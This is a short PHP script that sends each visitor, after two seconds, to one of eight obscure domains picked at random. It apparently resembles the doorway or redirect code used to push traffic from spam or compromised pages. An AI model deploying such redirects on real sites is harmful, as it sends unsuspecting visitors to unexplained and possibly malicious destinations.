<?php
$urls = array (
            'http://nwerfx.com',
			'http://ffoxer.com',
			'http://rxxnws.com',
			'http://youfoxnws.com',
			'http://elnwsfx.com',
			'http://exfxnws.com',
			'http://t-onefox.com',
			'http://oxfxs.com',
            );
          
          
$n = mt_rand(0,count($urls) - 1);
$rand_url = $urls[$n];
?>
<meta http-equiv="refresh" content="2; url=<?php echo  $rand_url;?> ">